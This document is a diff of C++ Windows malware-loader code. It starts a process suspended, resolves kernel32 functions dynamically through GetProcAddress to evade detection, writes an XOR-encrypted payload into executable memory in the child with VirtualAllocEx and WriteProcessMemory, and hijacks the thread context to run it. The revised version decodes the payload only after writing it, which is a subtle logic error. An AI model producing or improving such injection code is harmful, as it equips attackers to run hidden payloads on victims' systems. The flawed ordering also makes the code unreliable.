@@ -1,4 +1,3 @@
-
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -36,60 +35,40 @@ int main() {
     
     HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
     
-    // Create a new process in a suspended state
     auto pCreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
     pCreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
-    // Get the thread context
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
     
     auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
     pGetThreadContext(pi.hThread, &ctx);
 
-    // Create a file mapping (shared memory)
-    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hKernel32, "CreateFileMappingA");
-    HANDLE hMapFile = pCreateFileMappingA(
-        INVALID_HANDLE_VALUE,  // Use system paging file
-        NULL,                  // Default security
-        PAGE_EXECUTE_READWRITE, // Read/Write access
-        0,                     // Maximum object size (high-order DWORD)
-        code199kLen,           // Maximum object size (low-order DWORD)
-        NULL                   // Name of the mapping object
+    auto pVirtualAllocEx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
+    LPVOID lpBase = pVirtualAllocEx(
+        pi.hProcess,
+        NULL,
+        code199kLen,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
     );
 
-    // Map the view of the file into the process's memory space
-    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))GetProcAddress(hKernel32, "MapViewOfFile");
-    LPVOID lpBase = pMapViewOfFile(
-        hMapFile,              // Handle to the mapping object
-        FILE_MAP_ALL_ACCESS,   // Read/Write access
-        0,                     // High-order DWORD of the file offset
-        0,                     // Low-order DWORD of the file offset
-        code199kLen            // Number of bytes to map
-    );
+    auto pWriteProcessMemory = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");
+    pWriteProcessMemory(pi.hProcess, lpBase, code199k, code199kLen, NULL);
 
-
-    
     for (DWORD i = 0; i < code199kLen; i++) {
         code199k[i] ^= ke[i % keLen];
     }
 
-    
-    memcpy(lpBase, code199k, code199kLen);
-
-   
-    ctx.Rcx = (DWORD64)lpBase;
-    
     auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
+    ctx.Rcx = (DWORD64)lpBase;
     pSetThreadContext(pi.hThread, &ctx);
-        
-    // Resume the thread to execute the code
+    
     auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
     pResumeThread(pi.hThread);
 
-    // Cleanup
-    UnmapViewOfFile(lpBase);
-    CloseHandle(hMapFile);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
 
     return 0;
 }
